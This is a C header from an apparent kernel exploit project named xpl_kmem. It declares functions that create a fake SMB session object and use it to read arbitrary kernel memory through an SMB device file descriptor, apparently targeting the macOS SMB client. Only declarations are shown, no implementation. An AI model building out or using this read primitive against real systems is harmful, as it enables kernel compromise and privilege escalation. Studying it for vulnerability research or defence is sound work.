//
//  kmem_read_session.h
//  xpl_kmem
//
//  Created by admin on 2/22/22.
//

#ifndef kmem_read_session_h
#define kmem_read_session_h

#include <stdio.h>


static const struct sockaddr_in FAKE_SESSION_NIC_ADDR = {
    .sin_len = sizeof(struct sockaddr_in),
    .sin_family = AF_INET,
    .sin_port = 1234,
    .sin_addr = { 123456 },
};

#define FAKE_SESSION_NIC_INDEX   4321

typedef struct kmem_read_session* kmem_read_session_t;

/// Create a fake smb_session which can be used for arbitary kernel memory read
/// @param smb_addr Socket address of xpl_smbx server
kmem_read_session_t kmem_read_session_create(const struct sockaddr_in* smb_addr);

/// Returns the address of created fake_smb_session
/// @param session kmem_read_session_t created using method `kmem_read_session_create`
uintptr_t kmem_read_session_get_addr(kmem_read_session_t session);

/// Reads data from arbitary location in kernel memory
/// @param session kmem_read_session_t created using method `kmem_read_session_create`
/// @param smb_dev_fd file descriptor of smb_dev having `smb_dev->sd_session = fake_session`
/// @param dst pointer to buffer in user memory for storing read data
/// @param src address of kernel memory from where data is to be read
/// @param size size of data to be read
int kmem_read_session_read(kmem_read_session_t session, int smb_dev_fd, void* dst, uintptr_t src, size_t size);

/// Release resources
/// @param session_p pointer to kmem_read_session_t created using method `kmem_read_session_create`
void kmem_read_session_destroy(kmem_read_session_t* session_p);

#endif /* kmem_read_session_h */
